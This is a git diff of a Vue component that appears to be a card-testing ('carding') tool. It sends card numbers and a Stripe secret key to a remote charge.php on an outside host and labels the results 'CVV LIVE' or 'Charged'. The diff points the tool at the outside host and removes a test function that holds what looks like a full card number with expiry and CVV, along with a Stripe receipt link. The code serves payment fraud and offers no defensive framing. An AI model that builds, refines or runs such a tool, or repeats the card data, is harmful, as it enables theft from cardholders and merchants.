@@ -409,14 +409,13 @@ export default {
     },
     charge(cc, amount) {
       axios
-        .post("http://localhost/VIP/Main/charge.php", {
+        .post("https://asterian.dev/charge.php", {
           cc: cc,
           sk_key: this.sk,
           amount: amount,
         })
         .then((res) => {
           let data = res.data;
-          console.log(data);
           if (data.includes("CVV LIVE")) {
             if (data.includes("Charged")) {
               this.livecvv.push({
@@ -460,18 +459,6 @@ export default {
           }
         });
     },
-    test() {
-      let txt =
-        "CVV LIVE 5332480403707823|07|2023|567 > Charged: 0.5 $ : <a href='https://pay.stripe.com/receipts/acct_1JWplqSJCVkqBMND/ch_3JXXIRSJCVkqBMND1bQai4Cz/rcpt_KBv8MqY7bLz2yEI7GSnJsmCaCIZUjx7' target='_blank'>Receipt</a>";
-      if (txt.includes("Charged")) {
-        this.livecvv.push({
-          number: txt.split(" > ")[0].replace("CVV LIVE ", ""),
-          result: txt
-            .split(" > ")[1]
-            .replace("<a", "<a style='text-decoration:none;'"),
-        });
-      }
-    },
     checkSK() {
       if (this.sk == null || this.sk == "") {
         this.notitext = "No SK input!";
@@ -499,7 +486,6 @@ export default {
     },
   },
   created() {
-    this.test();
     let tmpsk = localStorage.getItem("sk_key");
     if (tmpsk != null && tmpsk != "" && tmpsk != "null") {
       this.sk = tmpsk;
